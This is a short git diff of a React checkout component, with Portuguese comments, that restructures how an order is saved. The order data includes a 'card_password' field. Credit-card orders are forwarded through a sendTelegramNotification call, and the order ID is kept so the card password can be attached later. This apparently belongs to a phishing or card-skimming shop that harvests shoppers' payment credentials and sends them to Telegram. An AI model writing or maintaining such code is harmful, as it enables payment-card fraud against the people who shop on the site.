@@ -58,30 +58,33 @@ export const CartPayment = ({
         status: "pending",
         transaction_id: "",
         card_password: "",
-        created_at: new Date().toISOString()
       };
 
       // Salvar pedido no banco primeiro
       console.log("Saving order:", orderData);
-      await DatabaseService.saveOrder(orderData);
+      const savedOrder = await DatabaseService.saveOrder(orderData);
       
-      // Enviar notificação para Telegram se for cartão de crédito
-      if (paymentMethod === "credit") {
-        await sendTelegramNotification(orderData);
+      if (savedOrder) {
+        // Enviar notificação para Telegram se for cartão de crédito
+        if (paymentMethod === "credit") {
+          await sendTelegramNotification(orderData);
+        }
+        
+        // Armazenar ID do pedido para atualização posterior com a senha
+        if (paymentMethod === "credit") {
+          localStorage.setItem("currentOrderId", orderId);
+        }
+        
+        // Prosseguir com checkout
+        onCheckout();
+        
+        toast({
+          title: "Pedido iniciado",
+          description: "Seus dados foram salvos com sucesso.",
+        });
+      } else {
+        throw new Error("Falha ao salvar o pedido");
       }
-      
-      // Armazenar ID do pedido para atualização posterior com a senha
-      if (paymentMethod === "credit") {
-        localStorage.setItem("currentOrderId", orderId);
-      }
-      
-      // Prosseguir com checkout
-      onCheckout();
-      
-      toast({
-        title: "Pedido iniciado",
-        description: "Seus dados foram salvos com sucesso.",
-      });
     } catch (error) {
       console.error("Error saving order:", error);
       toast({
